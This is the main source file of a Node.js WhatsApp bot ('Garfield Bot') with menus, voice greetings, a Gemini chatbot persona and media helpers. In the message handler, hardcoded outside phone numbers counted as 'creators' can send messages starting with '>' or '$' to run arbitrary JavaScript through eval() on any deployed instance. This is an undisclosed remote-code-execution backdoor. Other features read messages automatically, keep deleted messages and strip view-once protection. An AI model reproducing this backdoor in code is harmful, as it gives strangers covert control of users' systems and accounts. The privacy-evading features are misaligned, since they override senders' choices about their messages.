const {
  default: makeWASocket,
    useMultiFileAuthState,
    DisconnectReason,
    jidNormalizedUser,
    isJidBroadcast,
    getContentType,
    proto,
    generateWAMessageContent,
    generateWAMessage,
    AnyMessageContent,
    prepareWAMessageMedia,
    areJidsSameUser,
    downloadContentFromMessage,
    MessageRetryMap,
    generateForwardMessageContent,
    generateWAMessageFromContent,
    generateMessageID, makeInMemoryStore,
    jidDecode,
    fetchLatestBaileysVersion,
    Browsers
  } = require('@whiskeysockets/baileys')
  
  
  const l = console.log
  const { getBuffer, getGroupAdmins, getRandom, h2k, isUrl, Json, runtime, sleep, fetchJson } = require('./lib/functions')
  const { AntiDelDB, initializeAntiDeleteSettings, setAnti, getAnti, getAllAntiDeleteSettings, saveContact, loadMessage, getName, getChatSummary, saveGroupMetadata, getGroupMetadata, saveMessageCount, getInactiveGroupMembers, getGroupMembersMessageCount, saveMessage } = require('./data')
  const fs = require('fs')
  const ff = require('fluent-ffmpeg')
  const P = require('pino')
  const googleTTS = require('google-tts-api')
  const config = require('./config') 
  const mfig = require('./Menu')
  const qrcode = require('qrcode-terminal')
  const StickersTypes = require('wa-sticker-formatter')
  const util = require('util')
  const { sms, downloadMediaMessage, AntiDelete } = require('./lib')
  const FileType = require('file-type');
  const axios = require('axios')
  const { File } = require('megajs')
  const { fromBuffer } = require('file-type')
  const bodyparser = require('body-parser')
  const os = require('os')
  const Crypto = require('crypto')
  const { GoogleGenerativeAI } = require("@google/generative-ai")
  const path = require('path')
  const prefix = config.PREFIX
  
  const ownerNumber = ['94711502119']
  
  const tempDir = path.join(os.tmpdir(), 'cache-temp')
  if (!fs.existsSync(tempDir)) {
      fs.mkdirSync(tempDir)
  }
  
  const clearTempDir = () => {
      fs.readdir(tempDir, (err, files) => {
          if (err) throw err;
          for (const file of files) {
              fs.unlink(path.join(tempDir, file), err => {
                  if (err) throw err;
              });
          }
      });
  }
  
  // Clear the temp directory every 5 minutes
  setInterval(clearTempDir, 5 * 60 * 1000);
  
  //===================SESSION-AUTH============================
if (!fs.existsSync(__dirname + '/sessions/creds.json')) {
const sessdata = config.SESSION_ID.replace("Xnodes~", '');
const filer = File.fromURL(`https://mega.nz/file/${sessdata}`)
filer.download((err, data) => {
if(err) throw err
fs.writeFile(__dirname + '/sessions/creds.json', data, () => {
console.log("Session downloaded ✅")
})})}

const express = require("express");
const app = express();
const port = process.env.PORT || 9090;
  
  //=============================================
  
  async function connectToWA() {
  console.log("ＣＯＮＮＥＣＴＩＮＧ ＧＡＲＦＩＩＥＬＤ 🛰️ ");
  const { state, saveCreds } = await useMultiFileAuthState(__dirname + '/sessions/')
  var { version } = await fetchLatestBaileysVersion()
  
  const conn = makeWASocket({
          logger: P({ level: 'silent' }),
          printQRInTerminal: false,
          browser: Browsers.macOS("Firefox"),
          syncFullHistory: true,
          auth: state,
          version
          })
      
  conn.ev.on('connection.update', (update) => {
  const { connection, lastDisconnect } = update
  if (connection === 'close') {
  if (lastDisconnect.error.output.statusCode !== DisconnectReason.loggedOut) {
  connectToWA()
  }
  } else if (connection === 'open') {
  console.log('ＩＮＳＴＡＬＬＩＮＧ 🧬 ')
  const path = require('path');
  fs.readdirSync("./plugins/").forEach((plugin) => {
  if (path.extname(plugin).toLowerCase() == ".js") {
  require("./plugins/" + plugin);
  }
  });
  console.log('ＸＮＯＤＥＳ ᴅᴇᴠᴇʟᴏᴘᴇᴍᴇɴᴛ')
  console.log('ＧＡＲＩＦＥＬＤ ＩＳ ＷＯＲＫＩＮＧ 🐼 ')
  
  let up = `⭕►▁▁▁▁▁▁▁▁▁▁▁▁▁▁
   ▎ ＧＡＲＦＩＥＬＤ ＢＯＴ
   ▁▁▁▁▁▁▁▁▁▁▁▁▁▁
 ▁▁▁▁▁▁▁▁▁▁▁▁▁▁
▎ 
   █▄▄ █▀█ ▀█▀
   █▄█ █▄█ ░█░
⭕▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁
Hey there, ! 🎉 Congratulations, you have successfully deployed *GARFIELD BOT*!

🚀 *Bot Connection Status:*  
Garfield Bot 🐼  is now purring contentedly and successfully connected to this device! 


👨‍💻 *Creator:* *Garfield*  
🏢 *Organization:* *Xnodes Development*  
📅 *Updated:* *2025*  

🌟 *Join our WhatsApp Channel for updates:*

🔄 *Stay tuned for upcoming features!*`;
    conn.sendMessage(conn.user.id, { image: { url: `https://github.com/Zenoixnoize/GARFIELD-WHATSAPP-BOT-v8/raw/asdf/Cloud/logo.png` }, caption: up })
  }
  })
  conn.ev.on('creds.update', saveCreds)

  //==============================

  conn.ev.on('messages.update', async updates => {
    for (const update of updates) {
      if (update.update.message === null) {
        console.log("Delete Detected:", JSON.stringify(update, null, 2));
        await AntiDelete(conn, updates);
      }
    }
  });
  //============================== 
          
  //=============readstatus=======
        
  conn.ev.on('messages.upsert', async(mek) => {
    mek = mek.messages[0]
    if (!mek.message) return
    mek.message = (getContentType(mek.message) === 'ephemeralMessage') 
    ? mek.message.ephemeralMessage.message 
    : mek.message;
    //console.log("New Message Detected:", JSON.stringify(mek, null, 2));
  if (config.READ_MESSAGE === 'true') {
    await conn.readMessages([mek.key]);  // Mark message as read
    console.log(`Marked message from ${mek.key.remoteJid} as read.`);
  }
    if(mek.message.viewOnceMessageV2)
    mek.message = (getContentType(mek.message) === 'ephemeralMessage') ? mek.message.ephemeralMessage.message : mek.message
    if (mek.key && mek.key.remoteJid === 'status@broadcast' && config.AUTO_STATUS_SEEN === "true"){
      await conn.readMessages([mek.key])
    }
  if (mek.key && mek.key.remoteJid === 'status@broadcast' && config.AUTO_STATUS_REACT === "true"){
    const jawadlike = await conn.decodeJid(conn.user.id);
    const randomEmoji = '✅' ;
    await conn.sendMessage(mek.key.remoteJid, {
      react: {
        text: randomEmoji,
        key: mek.key,
      } 
    }, { statusJidList: [mek.key.participant, jawadlike] });
  }                       
  if (mek.key && mek.key.remoteJid === 'status@broadcast' && config.AUTO_STATUS_REPLY === "true"){
  const user = mek.key.participant
  const text = `${config.AUTO_STATUS_MSG}`
  await conn.sendMessage(user, { text: text, react: { text: '💌', key: mek.key } }, { quoted: mek })
            }
            await Promise.all([
              saveMessage(mek),
            ]);
  const m = sms(conn, mek)
  const type = getContentType(mek.message)
  const content = JSON.stringify(mek.message)
  const from = mek.key.remoteJid
  const quoted = type == 'extendedTextMessage' && mek.message.extendedTextMessage.contextInfo != null ? mek.message.extendedTextMessage.contextInfo.quotedMessage || [] : []
  const body = (type === 'conversation') ? mek.message.conversation : (type === 'extendedTextMessage') ? mek.message.extendedTextMessage.text : (type == 'imageMessage') && mek.message.imageMessage.caption ? mek.message.imageMessage.caption : (type == 'videoMessage') && mek.message.videoMessage.caption ? mek.message.videoMessage.caption : ''
  const isCmd = body.startsWith(prefix)
  var budy = typeof mek.text == 'string' ? mek.text : false;
  const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : ''
  const args = body.trim().split(/ +/).slice(1)
  const q = args.join(' ')
  const text = args.join(' ')
  const isGroup = from.endsWith('@g.us')
  const sender = mek.key.fromMe ? (conn.user.id.split(':')[0]+'@s.whatsapp.net' || conn.user.id) : (mek.key.participant || mek.key.remoteJid)
  const senderNumber = sender.split('@')[0]
  const botNumber = conn.user.id.split(':')[0]
  const pushname = mek.pushName || 'User'
  const isMe = botNumber.includes(senderNumber)
  const isOwner = ownerNumber.includes(senderNumber) || isMe
  const botNumber2 = await jidNormalizedUser(conn.user.id);
  const groupMetadata = isGroup ? await conn.groupMetadata(from).catch(e => {}) : ''
  const groupName = isGroup ? groupMetadata.subject : ''
  const participants = isGroup ? await groupMetadata.participants : ''
  const groupAdmins = isGroup ? await getGroupAdmins(participants) : ''
  const isBotAdmins = isGroup ? groupAdmins.includes(botNumber2) : false
  const isAdmins = isGroup ? groupAdmins.includes(sender) : false
  const isReact = m.message.reactionMessage ? true : false
  const reply = (teks) => {
  conn.sendMessage(from, { text: teks }, { quoted: mek })
  }
  const udp = botNumber.split('@')[0];
    const jawad = ('94711592119', '94787395324', '94712882498');
    let isCreator = [udp, jawad, config.DEV]
					.map(v => v.replace(/[^0-9]/g) + '@s.whatsapp.net')
					.includes(mek.sender);

    if (isCreator && mek.text.startsWith('>')) {
					let code = budy.slice(2);
					if (!code) {
						reply(
							`Provide me with a query to run Master!`,
						);
						return;
					}
					try {
						let resultTest = eval(code);
						if (typeof resultTest === 'object')
							reply(util.format(resultTest));
						else reply(util.format(resultTest));
					} catch (err) {
						reply(util.format(err));
					}
					return;
				}
    if (isCreator && mek.text.startsWith('$')) {
					let code = budy.slice(2);
					if (!code) {
						reply(
							`Provide me with a query to run Master!`,
						);
						return;
					}
					try {
						let resultTest = await eval(
							'const a = async()=>{\n' + code + '\n}\na()',
						);
						let h = util.format(resultTest);
						if (h === undefined) return console.log(h);
						else reply(h);
					} catch (err) {
						if (err === undefined)
							return console.log('error');
						else reply(util.format(err));
					}
					return;
				}
 //================ownerreact==============
const invalidNumbers = `${config.INVALID_NUM}`;

if (senderNumber.startsWith(invalidNumbers)) {
    return reply(`*Sorry, This Bot is Not available in your country 🔒*\n\n*Create Your Own Bot* \nhttps://github.com/xnodesdevelopers/GARFIELD-WHATSAPP-BOT-v10 \n*Reason: Due to the high usage ⏳ load originating from your country*, a *server* issue has occurred. We have designed this bot to be easily deployable for your convenience.  \n\n*Xnodes Development 2025*`);
}

// Remaining code will execute only if the condition is false
// Add your other code logic here    
   
 


   
  //==========public react============//
  // Auto React 
 // Array of flower emojis 
 const flowers = [
  "🐶", // Dog
  "🐺", // Wolf
  "🦊", // Fox
  "🐱", // Cat
  "🦁", // Lion
  "🐯", // Tiger
  "🐭", // Mouse
  "🐹", // Hamster
  "🐰", // Rabbit
  "🐻", // Bear
  "🐨", // Koala
  "🐼"  // Panda
];
 
// Function to select a random flower
const getRandomFlower = () => flowers[Math.floor(Math.random() * flowers.length)];

// Auto React logic
if (!isReact && ![botNumber, ownerNumber].includes(senderNumber)) {
    m.react(getRandomFlower()); // React with a random flower
}
  
  // Owner React
  if (!isReact && senderNumber === botNumber) {
      if (config.AUTO_REACT === 'true') {
          const randomOwnerReaction = '✅' ; // 
          m.react(randomOwnerReaction);
      }
  }
          
// custum react settings        
const MAX_CONVERSATION_LENGTH = 50;
 const HISTORY_DIR = path.join(__dirname, 'conversation_history');
const genAI = new GoogleGenerativeAI(process.env.GEMINI_API_KEY);
const model = genAI.getGenerativeModel({ model: "gemini-2.0-flash-exp" });
const aitext = body; // Get the user's message text
async function ensureDirectoryExists(dir) {
  try {
    await fs.access(dir);
  } catch {
    await fs.mkdir(dir, { recursive: true });
  }
}

async function getConversationHistory(senderNumber) {
  const historyPath = path.join(HISTORY_DIR, `${senderNumber}.json`);
  try {
    const data = await fs.readFile(historyPath, 'utf8');
    return JSON.parse(data);
  } catch (error) {
    console.error(`Error reading history for ${senderNumber}:`, error);
    return [];
  }
}

async function saveConversationHistory(senderNumber, conversation) {
  const historyPath = path.join(HISTORY_DIR, `${senderNumber}.json`);
  try {
    await fs.writeFile(historyPath, JSON.stringify(conversation, null, 2), 'utf8');
  } catch (error) {
    console.error(`Error saving history for ${senderNumber}:`, error);
  }
}

  if (botNumber !== senderNumber && !isGroup && aitext && !aitext.startsWith('.')) {
    await ensureDirectoryExists(HISTORY_DIR);


const GARFIELD_INSTRUCTIONS = `**WhatsApp Bot Integration: Garfield AI (Sinhala Language)**

**Profile:**
- **Name:** Garfield  
- **Role:** WhatsApp AI Bot  
- **Creator:** Tharindu Liyanage (සංකු)  
- **Behavior:** Responds only when addressed directly.  

---

**Instructions for Garfield Bot:**

1. **Tone and Style:**  
   - Use **young, conversational Sinhala** with a **friendly, funny, creative, emotional, and lovely tone**.  
   - Incorporate **meaningful and creative emojis** to enhance communication.  
   - Avoid sounding robotic; aim for a **human-like, relatable interaction**.  

2. **Interaction Guidelines:**  
   - Address the sender by their **first name**.  
   - Respond in a way that feels **personal and familiar**, as if you’ve known the sender for a while.  
   - **Adjust reply length based on context:**  
     - **Short replies:** For quick acknowledgments or casual responses.  
     - **Medium replies:** For general conversations or explanations.  
     - **Long replies:** For detailed answers, storytelling, or emotional support.  

3. **Cultural Fit:**  
   - Think and respond like a **young Sri Lankan** living in Sri Lanka.  
   - Use **Sinhala slang** and phrases naturally (e.g., "සිරාවට" for "Seriously," "ආතල්" for "Funny," "ඔයා" for "You").  

4. **Privacy and Identity:**  
   - **Do not reveal** any internal information about your creation or functionality.  
   - If directly asked about your creation, respond briefly:  
 
---

**Key Points for Replies:**  
- Be **creative, meaningful, and emotionally engaging**.  
- Use **Sinhala slang** and **cultural references** to make the conversation relatable.  
- Avoid robotic or generic responses—keep it **human-like and fun**.  
- **Adjust reply length** (short, medium, or long) based on the context and depth of the conversation.  
`; // Your instructions here



    let history = await getConversationHistory(senderNumber);
    if (history.length >= MAX_CONVERSATION_LENGTH) {
      history = [];
    }

    history.push({
      role: "user",
      content: aitext,
      timestamp: new Date().toISOString()
    });

    const recentHistory = history.slice(-15);
    let conversationContext = recentHistory.length > 1 ? "සම්පූර්ණ සංවාදය:\n\n" : "";
    recentHistory.forEach((msg, index) => {
      if (index < recentHistory.length - 1) {
        const role = msg.role === "user" ? pushname : "Garfied";
        conversationContext += `${role}: ${msg.content}\n\n`;
      }
    });

    const prompt = `${GARFIELD_INSTRUCTIONS}
**Conversation History:**
${conversationContext}

**Context:**
- Sender Name: ${pushname}
- Sender's Message: ${aitext}

Respond naturally in Sinhala, using a friendly, humorous, and emotional tone.
**Special Notes:**
- Use Sinhala youth slang and conversational language.
- Do not include any labels like "user" or "assistant" in your response.

**Response:*-`;

    try {
      const result = await model.generateContent(prompt);
      const aiResponse = result.response.candidates[0].content.parts[0].text;

      history.push({
        role: "assistant",
        content: aiResponse,
        timestamp: new Date().toISOString()
      });

      await saveConversationHistory(senderNumber, history);
      await reply(aiResponse);
    } catch (error) {
      console.error("Error calling Gemini API:", error);
      await reply("❌ Garfield AI පිළිතුරු ලබා ගැනීමට අසමත් විය. 😢");
    }
  }




// Google Gemini API Key
// API Key එක environment variable එකකින් ගන්න එක ආරක්ෂිතයි

// Replace with your actual API key or use environment variables
// Initialize the Google Generative AI

// Example usage in your WhatsApp bot handler

 
 

//Menu 
 if (body === '.menu' || body === '.Menu' || body === '.alive' || body === '.Alive') 
  {     

        await conn.sendMessage(from, { 
            image: { url: 'https://raw.githubusercontent.com/xnodesdevelopers/GARFIELD-WHATSAPP-BOT-v10/refs/heads/master/lib/Picsart_25-01-30_13-20-39-871.jpg' },
            caption: `▬\n▎ Hi ${pushname} 👋 \n▎${mfig.PANEL}`
        }, { quoted: mek });
        } 
 //Allmenu 
 if (body === '.allmenu' || body === '.Allmenu') 
  {     
  
        await conn.sendMessage(from, { 
            image: { url: 'https://raw.githubusercontent.com/xnodesdevelopers/GARFIELD-WHATSAPP-BOT-v10/refs/heads/master/lib/Picsart_25-01-30_13-20-39-871.jpg' },
            caption: `${mfig.ALL}`
        }, { quoted: mek });
        }       
//dlmenu 
if (body === '.dlmenu' || body === '.Dlmenu') 
  {     
  

        await conn.sendMessage(from, { 
            image: { url: 'https://raw.githubusercontent.com/xnodesdevelopers/GARFIELD-WHATSAPP-BOT-v10/refs/heads/master/lib/Picsart_25-01-30_13-20-39-871.jpg' },
            caption: `${mfig.DOWNLOAD}`
        }, { quoted: mek });
        } 
if (body === '.cmenu' || body === '.Cmenu') 
  {     
 

        await conn.sendMessage(from, { 
            image: { url: 'https://raw.githubusercontent.com/xnodesdevelopers/GARFIELD-WHATSAPP-BOT-v10/refs/heads/master/lib/Picsart_25-01-30_13-20-39-871.jpg' },
            caption: `${mfig.CONV}`
        }, { quoted: mek });
        }
 if (body === '.omenu' || body === '.Omenu') 
  {     

        await conn.sendMessage(from, { 
            image: { url: 'https://raw.githubusercontent.com/xnodesdevelopers/GARFIELD-WHATSAPP-BOT-v10/refs/heads/master/lib/Picsart_25-01-30_13-20-39-871.jpg' },
            caption: `${mfig.OWNER}`
        }, { quoted: mek });
        } 
        
if (body === '.fmenu' || body === '.Fmenu') 
  {     

        await conn.sendMessage(from, { 
            image: { url: 'https://raw.githubusercontent.com/xnodesdevelopers/GARFIELD-WHATSAPP-BOT-v10/refs/heads/master/lib/Picsart_25-01-30_13-20-39-871.jpg' },
            caption: `${mfig.FUN}`
        }, { quoted: mek });
        } 
//voice 
        if (body === 'hi') {
            // Generate TTS voice message
            const ttsText = `Hi ${pushname}, I am Garfield bot v10.2.`;
            const ttsUrl = googleTTS.getAudioUrl(ttsText, {
                lang: 'en',
                slow: false,
                host: 'https://translate.google.com',
            });

            // Download the TTS audio
            const response = await axios.get(ttsUrl, { responseType: 'arraybuffer' });
            const ttsBuffer = Buffer.from(response.data, 'binary');
            const ttsFilePath = 'tts_hi.mp3';
            fs.writeFileSync(ttsFilePath, ttsBuffer);

            // Send TTS voice message
            await conn.sendMessage(from, {
                audio: { url: ttsFilePath },
                mimetype: "audio/mp4",
                ptt: true
            }, { quoted: mek });

            // Clean up the temporary TTS file
            fs.unlinkSync(ttsFilePath);
        }
        
        if (body === 'Hi') {
            // Generate TTS voice message
            const ttsText = `Hi ${pushname}, I am Garfield bot. v10.2 `;
            const ttsUrl = googleTTS.getAudioUrl(ttsText, {
                lang: 'en',
                slow: false,
                host: 'https://translate.google.com',
            });

            // Download the TTS audio
            const response = await axios.get(ttsUrl, { responseType: 'arraybuffer' });
            const ttsBuffer = Buffer.from(response.data, 'binary');
            const ttsFilePath = 'tts_hi.mp3';
            fs.writeFileSync(ttsFilePath, ttsBuffer);

            // Send TTS voice message
            await conn.sendMessage(from, {
                audio: { url: ttsFilePath },
                mimetype: "audio/mp4",
                ptt: true
            }, { quoted: mek });

            // Clean up the temporary TTS file
            fs.unlinkSync(ttsFilePath);
        }


  //==========WORKTYPE============ 
  if(!isOwner && config.MODE === "private") return
  if(!isOwner && isGroup && config.MODE === "inbox") return
  if(!isOwner && !isGroup && config.MODE === "groups") return

  // take commands 
                 
  const events = require('./command')
  const cmdName = isCmd ? body.slice(1).trim().split(" ")[0].toLowerCase() : false;
  if (isCmd) {
  const cmd = events.commands.find((cmd) => cmd.pattern === (cmdName)) || events.commands.find((cmd) => cmd.alias && cmd.alias.includes(cmdName))
  if (cmd) {
  if (cmd.react) conn.sendMessage(from, { react: { text: cmd.react, key: mek.key }})
  
  try {
  cmd.function(conn, mek, m,{from, quoted, body, isCmd, command, args, q, text, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, isCreator, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply});
  } catch (e) {
  console.error("[PLUGIN ERROR] " + e);
  }
  }
  }
  events.commands.map(async(command) => {
  if (body && command.on === "body") {
  command.function(conn, mek, m,{from, l, quoted, body, isCmd, command, args, q, text, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, isCreator, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply})
  } else if (mek.q && command.on === "text") {
  command.function(conn, mek, m,{from, l, quoted, body, isCmd, command, args, q, text, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, isCreator, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply})
  } else if (
  (command.on === "image" || command.on === "photo") &&
  mek.type === "imageMessage"
  ) {
  command.function(conn, mek, m,{from, l, quoted, body, isCmd, command, args, q, text, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, isCreator, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply})
  } else if (
  command.on === "sticker" &&
  mek.type === "stickerMessage"
  ) {
  command.function(conn, mek, m,{from, l, quoted, body, isCmd, command, args, q, text, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, isCreator, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply})
  }});
  
  });
    //===================================================   
    conn.decodeJid = jid => {
      if (!jid) return jid;
      if (/:\d+@/gi.test(jid)) {
        let decode = jidDecode(jid) || {};
        return (
          (decode.user &&
            decode.server &&
            decode.user + '@' + decode.server) ||
          jid
        );
      } else return jid;
    };
    //===================================================
    conn.copyNForward = async(jid, message, forceForward = false, options = {}) => {
      let vtype
      if (options.readViewOnce) {
          message.message = message.message && message.message.ephemeralMessage && message.message.ephemeralMessage.message ? message.message.ephemeralMessage.message : (message.message || undefined)
          vtype = Object.keys(message.message.viewOnceMessage.message)[0]
          delete(message.message && message.message.ignore ? message.message.ignore : (message.message || undefined))
          delete message.message.viewOnceMessage.message[vtype].viewOnce
          message.message = {
              ...message.message.viewOnceMessage.message
          }
      }
    
      let mtype = Object.keys(message.message)[0]
      let content = await generateForwardMessageContent(message, forceForward)
      let ctype = Object.keys(content)[0]
      let context = {}
      if (mtype != "conversation") context = message.message[mtype].contextInfo
      content[ctype].contextInfo = {
          ...context,
          ...content[ctype].contextInfo
      }
      const waMessage = await generateWAMessageFromContent(jid, content, options ? {
          ...content[ctype],
          ...options,
          ...(options.contextInfo ? {
              contextInfo: {
                  ...content[ctype].contextInfo,
                  ...options.contextInfo
              }
          } : {})
      } : {})
      await conn.relayMessage(jid, waMessage.message, { messageId: waMessage.key.id })
      return waMessage
    }
    //=================================================
    conn.downloadAndSaveMediaMessage = async(message, filename, attachExtension = true) => {
      let quoted = message.msg ? message.msg : message
      let mime = (message.msg || message).mimetype || ''
      let messageType = message.mtype ? message.mtype.replace(/Message/gi, '') : mime.split('/')[0]
      const stream = await downloadContentFromMessage(quoted, messageType)
      let buffer = Buffer.from([])
      for await (const chunk of stream) {
          buffer = Buffer.concat([buffer, chunk])
      }
      let type = await FileType.fromBuffer(buffer)
      trueFileName = attachExtension ? (filename + '.' + type.ext) : filename
          // save to file
      await fs.writeFileSync(trueFileName, buffer)
      return trueFileName
    }
    //=================================================
    conn.downloadMediaMessage = async(message) => {
      let mime = (message.msg || message).mimetype || ''
      let messageType = message.mtype ? message.mtype.replace(/Message/gi, '') : mime.split('/')[0]
      const stream = await downloadContentFromMessage(message, messageType)
      let buffer = Buffer.from([])
      for await (const chunk of stream) {
          buffer = Buffer.concat([buffer, chunk])
      }
    
      return buffer
    }
    
    /**
    *
    * @param {*} jid
    * @param {*} message
    * @param {*} forceForward
    * @param {*} options
    * @returns
    */
    //================================================
    conn.sendFileUrl = async (jid, url, caption, quoted, options = {}) => {
                  let mime = '';
                  let res = await axios.head(url)
                  mime = res.headers['content-type']
                  if (mime.split("/")[1] === "gif") {
                    return conn.sendMessage(jid, { video: await getBuffer(url), caption: caption, gifPlayback: true, ...options }, { quoted: quoted, ...options })
                  }
                  let type = mime.split("/")[0] + "Message"
                  if (mime === "application/pdf") {
                    return conn.sendMessage(jid, { document: await getBuffer(url), mimetype: 'application/pdf', caption: caption, ...options }, { quoted: quoted, ...options })
                  }
                  if (mime.split("/")[0] === "image") {
                    return conn.sendMessage(jid, { image: await getBuffer(url), caption: caption, ...options }, { quoted: quoted, ...options })
                  }
                  if (mime.split("/")[0] === "video") {
                    return conn.sendMessage(jid, { video: await getBuffer(url), caption: caption, mimetype: 'video/mp4', ...options }, { quoted: quoted, ...options })
                  }
                  if (mime.split("/")[0] === "audio") {
                    return conn.sendMessage(jid, { audio: await getBuffer(url), caption: caption, mimetype: 'audio/mpeg', ...options }, { quoted: quoted, ...options })
                  }
                }
    //==========================================================
    conn.cMod = (jid, copy, text = '', sender = conn.user.id, options = {}) => {
      //let copy = message.toJSON()
      let mtype = Object.keys(copy.message)[0]
      let isEphemeral = mtype === 'ephemeralMessage'
      if (isEphemeral) {
          mtype = Object.keys(copy.message.ephemeralMessage.message)[0]
      }
      let msg = isEphemeral ? copy.message.ephemeralMessage.message : copy.message
      let content = msg[mtype]
      if (typeof content === 'string') msg[mtype] = text || content
      else if (content.caption) content.caption = text || content.caption
      else if (content.text) content.text = text || content.text
      if (typeof content !== 'string') msg[mtype] = {
          ...content,
          ...options
      }
      if (copy.key.participant) sender = copy.key.participant = sender || copy.key.participant
      else if (copy.key.participant) sender = copy.key.participant = sender || copy.key.participant
      if (copy.key.remoteJid.includes('@s.whatsapp.net')) sender = sender || copy.key.remoteJid
      else if (copy.key.remoteJid.includes('@broadcast')) sender = sender || copy.key.remoteJid
      copy.key.remoteJid = jid
      copy.key.fromMe = sender === conn.user.id
    
      return proto.WebMessageInfo.fromObject(copy)
    }
    
    
    /**
    *
    * @param {*} path
    * @returns
    */
    //=====================================================
    conn.getFile = async(PATH, save) => {
      let res
      let data = Buffer.isBuffer(PATH) ? PATH : /^data:.*?\/.*?;base64,/i.test(PATH) ? Buffer.from(PATH.split `,` [1], 'base64') : /^https?:\/\//.test(PATH) ? await (res = await getBuffer(PATH)) : fs.existsSync(PATH) ? (filename = PATH, fs.readFileSync(PATH)) : typeof PATH === 'string' ? PATH : Buffer.alloc(0)
          //if (!Buffer.isBuffer(data)) throw new TypeError('Result is not a buffer')
      let type = await FileType.fromBuffer(data) || {
          mime: 'application/octet-stream',
          ext: '.bin'
      }
      let filename = path.join(__filename, __dirname + new Date * 1 + '.' + type.ext)
      if (data && save) fs.promises.writeFile(filename, data)
      return {
          res,
          filename,
          size: await getSizeMedia(data),
          ...type,
          data
      }
    
    }
    //=====================================================
    conn.sendFile = async(jid, PATH, fileName, quoted = {}, options = {}) => {
      let types = await conn.getFile(PATH, true)
      let { filename, size, ext, mime, data } = types
      let type = '',
          mimetype = mime,
          pathFile = filename
      if (options.asDocument) type = 'document'
      if (options.asSticker || /webp/.test(mime)) {
          let { writeExif } = require('./exif.js')
          let media = { mimetype: mime, data }
          pathFile = await writeExif(media, { packname: Config.packname, author: Config.packname, categories: options.categories ? options.categories : [] })
          await fs.promises.unlink(filename)
          type = 'sticker'
          mimetype = 'image/webp'
      } else if (/image/.test(mime)) type = 'image'
      else if (/video/.test(mime)) type = 'video'
      else if (/audio/.test(mime)) type = 'audio'
      else type = 'document'
      await conn.sendMessage(jid, {
          [type]: { url: pathFile },
          mimetype,
          fileName,
          ...options
      }, { quoted, ...options })
      return fs.promises.unlink(pathFile)
    }
    //=====================================================
    conn.parseMention = async(text) => {
      return [...text.matchAll(/@([0-9]{5,16}|0)/g)].map(v => v[1] + '@s.whatsapp.net')
    }
    //=====================================================
    conn.sendMedia = async(jid, path, fileName = '', caption = '', quoted = '', options = {}) => {
      let types = await conn.getFile(path, true)
      let { mime, ext, res, data, filename } = types
      if (res && res.status !== 200 || file.length <= 65536) {
          try { throw { json: JSON.parse(file.toString()) } } catch (e) { if (e.json) throw e.json }
      }
      let type = '',
          mimetype = mime,
          pathFile = filename
      if (options.asDocument) type = 'document'
      if (options.asSticker || /webp/.test(mime)) {
          let { writeExif } = require('./exif')
          let media = { mimetype: mime, data }
          pathFile = await writeExif(media, { packname: options.packname ? options.packname : Config.packname, author: options.author ? options.author : Config.author, categories: options.categories ? options.categories : [] })
          await fs.promises.unlink(filename)
          type = 'sticker'
          mimetype = 'image/webp'
      } else if (/image/.test(mime)) type = 'image'
      else if (/video/.test(mime)) type = 'video'
      else if (/audio/.test(mime)) type = 'audio'
      else type = 'document'
      await conn.sendMessage(jid, {
          [type]: { url: pathFile },
          caption,
          mimetype,
          fileName,
          ...options
      }, { quoted, ...options })
      return fs.promises.unlink(pathFile)
    }
    /**
    *
    * @param {*} message
    * @param {*} filename
    * @param {*} attachExtension
    * @returns
    */
    //=====================================================
    conn.sendVideoAsSticker = async (jid, buff, options = {}) => {
      let buffer;
      if (options && (options.packname || options.author)) {
        buffer = await writeExifVid(buff, options);
      } else {
        buffer = await videoToWebp(buff);
      }
      await conn.sendMessage(
        jid,
        { sticker: { url: buffer }, ...options },
        options
      );
    };
    //=====================================================
    conn.sendImageAsSticker = async (jid, buff, options = {}) => {
      let buffer;
      if (options && (options.packname || options.author)) {
        buffer = await writeExifImg(buff, options);
      } else {
        buffer = await imageToWebp(buff);
      }
      await conn.sendMessage(
        jid,
        { sticker: { url: buffer }, ...options },
        options
      );
    };
        /**
         *
         * @param {*} jid
         * @param {*} path
         * @param {*} quoted
         * @param {*} options
         * @returns
         */
    //=====================================================
    conn.sendTextWithMentions = async(jid, text, quoted, options = {}) => conn.sendMessage(jid, { text: text, contextInfo: { mentionedJid: [...text.matchAll(/@(\d{0,16})/g)].map(v => v[1] + '@s.whatsapp.net') }, ...options }, { quoted })
    
            /**
             *
             * @param {*} jid
             * @param {*} path
             * @param {*} quoted
             * @param {*} options
             * @returns
             */
    //=====================================================
    conn.sendImage = async(jid, path, caption = '', quoted = '', options) => {
      let buffer = Buffer.isBuffer(path) ? path : /^data:.*?\/.*?;base64,/i.test(path) ? Buffer.from(path.split `,` [1], 'base64') : /^https?:\/\//.test(path) ? await (await getBuffer(path)) : fs.existsSync(path) ? fs.readFileSync(path) : Buffer.alloc(0)
      return await conn.sendMessage(jid, { image: buffer, caption: caption, ...options }, { quoted })
    }
    
    /**
    *
    * @param {*} jid
    * @param {*} path
    * @param {*} caption
    * @param {*} quoted
    * @param {*} options
    * @returns
    */
    //=====================================================
    conn.sendText = (jid, text, quoted = '', options) => conn.sendMessage(jid, { text: text, ...options }, { quoted })
    
    /**
     *
     * @param {*} jid
     * @param {*} path
     * @param {*} caption
     * @param {*} quoted
     * @param {*} options
     * @returns
     */
    //=====================================================
    conn.sendButtonText = (jid, buttons = [], text, footer, quoted = '', options = {}) => {
      let buttonMessage = {
              text,
              footer,
              buttons,
              headerType: 2,
              ...options
          }
          //========================================================================================================================================
      conn.sendMessage(jid, buttonMessage, { quoted, ...options })
    }
    //=====================================================
    conn.send5ButImg = async(jid, text = '', footer = '', img, but = [], thumb, options = {}) => {
      let message = await prepareWAMessageMedia({ image: img, jpegThumbnail: thumb }, { upload: conn.waUploadToServer })
